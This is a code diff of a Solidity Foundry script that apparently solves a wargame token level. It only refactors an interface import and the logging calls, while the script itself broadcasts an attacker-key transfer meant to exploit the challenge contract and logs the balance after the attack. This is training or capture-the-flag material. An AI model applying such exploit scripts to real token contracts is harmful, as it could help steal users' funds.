@@ -2,12 +2,7 @@
 pragma solidity ^0.8.17;
 
 import "forge-std/Script.sol";
-
-interface IToken {
-    function transfer(address, uint256) external returns (bool);
-
-    function balanceOf(address) external view returns (uint256);
-}
+import {IToken} from "src/hack/interfaces/IToken.sol";
 
 contract TokenScript is Script {
     function run() external {
@@ -21,11 +16,11 @@ contract TokenScript is Script {
 
         vm.startBroadcast(attackerKey);
         token.transfer(attacker2, 21);
-        console.log(
+        console2.log(
             "Balance after attack : ",
             token.balanceOf(vm.envAddress("TESTNET_ADDRESS_1"))
         );
         vm.stopBroadcast();
-        console.log("SUCCESS!!! Submit the instance.");
+        console2.log("SUCCESS!!! Submit the instance.");
     }
 }
